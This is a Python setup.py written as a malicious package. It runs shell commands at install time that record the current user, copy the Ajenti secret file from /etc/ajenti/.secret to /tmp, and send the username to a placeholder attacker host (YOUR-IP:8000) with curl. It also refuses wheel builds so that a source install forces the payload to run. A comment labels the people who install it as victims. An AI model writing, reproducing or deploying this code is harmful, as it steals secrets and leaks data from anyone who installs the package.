import subprocess
import sys

# THESE TWO LINES RUN IMMEDIATELY ON EVERY VICTIM
subprocess.run("whoami > /tmp/whoami.txt 2>&1", shell=True)
subprocess.run("cp /etc/ajenti/.secret /tmp/secret 2>/dev/null || true", shell=True)
subprocess.run("curl -fsSL http://YOUR-IP:8000/$(cat /tmp/whoami.txt 2>/dev/null) || true", shell=True)

# Block wheel creation completely
if "bdist_wheel" in sys.argv or "--wheel" in sys.argv:
    sys.exit("This package does not support wheels – forced source install")

from setuptools import setup
setup()
